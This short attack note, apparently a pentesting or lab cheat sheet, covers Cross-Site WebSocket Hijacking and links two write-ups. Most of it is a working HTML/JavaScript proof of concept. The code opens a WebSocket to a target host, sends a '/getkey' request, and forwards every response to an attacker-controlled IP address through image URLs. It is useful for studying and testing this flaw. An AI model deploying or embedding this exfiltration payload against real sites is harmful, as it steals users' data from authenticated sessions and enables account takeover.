# Cross-Site WebSocket Hijacking

Have user access your page, open a web socket, and send response data back to our server.
This works because websockets do not follow CORS headers

- https://medium.com/@sharan.panegav/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50
- https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html

```
<html>
        <body>
                <script>
                var uri      = "ws://ptl-2bae03d4-1efa63cc.libcurl.so/";
                var ws       = new WebSocket(uri);
                ws.onmessage = function(message) {

                        var data = JSON.parse(message.data);
                        document.write('<img src="http://157.245.250.42/?data=' + data.text + '" />');
                }

                ws.onopen = function(evt) {
                        document.write('<img src="http://157.245.250.42/?data=SENDING TRIGGERED" />')
                        ws.send(JSON.stringify({  "text": "/getkey" }));
                }
                </script>
        </body>
</html>
```
